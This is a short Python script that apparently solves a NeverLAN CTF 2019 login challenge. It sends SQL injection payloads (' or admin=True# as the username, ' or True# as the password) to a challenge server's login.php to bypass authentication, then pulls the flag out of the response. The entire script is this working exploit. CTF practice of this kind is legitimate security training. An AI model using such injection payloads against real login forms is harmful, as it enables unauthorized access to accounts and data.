#!/usr/bin/env python3

import requests

s = requests.Session()
url = "https://challenges.neverlanctf.com:1165/login.php"
payload = "?username=%27+or+admin=True%23&password=%27+or+True%23"
data = s.get(url + payload).text
print("flag{" + data.split("flag{")[1].split("}")[0] + "}")

'''
Username: ' or admin=True#
Password: ' or True#
'''
# https://nosecurity.blog/neverLAN2019
